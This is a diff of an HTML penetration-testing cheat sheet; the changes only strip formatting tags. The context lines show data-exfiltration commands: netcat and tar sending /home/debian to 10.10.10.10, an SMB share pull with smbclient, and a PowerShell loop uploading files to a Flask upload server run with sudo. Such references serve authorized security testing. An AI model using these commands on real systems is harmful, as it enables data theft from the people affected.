@@ -318,21 +318,21 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
 
 <table>
   <tr>
-    <td><b>Exfil via Embedded Linux</b></td>
+    <td>Exfil via Embedded Linux</td>
     <td>
       <pre><code>nc -l -p 1234 | tar xf -
 tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Exfil via SMB</b></td>
+    <td>Exfil via SMB</td>
     <td>
       <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
 tar xf share.tar -C share</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Exfil via PowerShell to Flask Upload Server</b></td>
+    <td>Exfil via PowerShell to Flask Upload Server</td>
     <td>
       <pre><code>$files = Get-ChildItem -Path "S:\" -Recurse -File
 foreach ($file in $files) {
@@ -352,7 +352,7 @@ def upload():
     return 'File uploaded successfully'
 
 app.run(host='0.0.0.0', port=80)</code></pre>
-      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
+      <p><i>Run with:</i><code>sudo python3 upload_server.py</code></p>
     </td>
   </tr>
 </table>
